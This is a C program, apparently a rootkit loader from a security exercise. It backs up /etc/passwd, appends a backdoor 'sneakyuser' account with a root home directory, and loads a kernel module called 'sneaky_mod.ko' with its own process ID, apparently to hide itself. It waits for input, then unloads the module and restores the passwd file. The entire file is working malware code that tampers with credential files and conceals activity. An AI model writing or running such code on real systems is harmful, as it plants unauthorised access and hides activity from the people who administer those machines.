#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#define BUFFER_SIZE 1024
#define INPUT_STR_SIZE 100
void readCharacter() {
  char ch = 0;
  while ((ch = getchar()) != 'q') {
  }
}

void packSystemString(char * string, pid_t pid) {
  snprintf(string, INPUT_STR_SIZE, "insmod sneaky_mod.ko sneaky_pid=%d", (int)pid);
}

void setupPasswd() {
  system("cp /etc/passwd /tmp/");
  system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> /etc/passwd");
}

void restorePasswd() {
  system("cp /tmp/passwd /etc/");
  system("rm /tmp/passwd");
}

void load_module() {
  // setup fake password
  setupPasswd();
  // pass in process id
  pid_t pid = getpid();
  printf("sneaky process with pid %d\n", (int)pid);
  char system_str[INPUT_STR_SIZE] = {0};
  packSystemString(system_str, pid);
  // load module
  system(system_str);
}

void run_module() {
  // insert malicious module
  readCharacter();
}

void remove_module() {
  // remove the module
  system("rmmod sneaky_mod");
  restorePasswd();
}

int main() {
  load_module();
  run_module();
  remove_module();
}
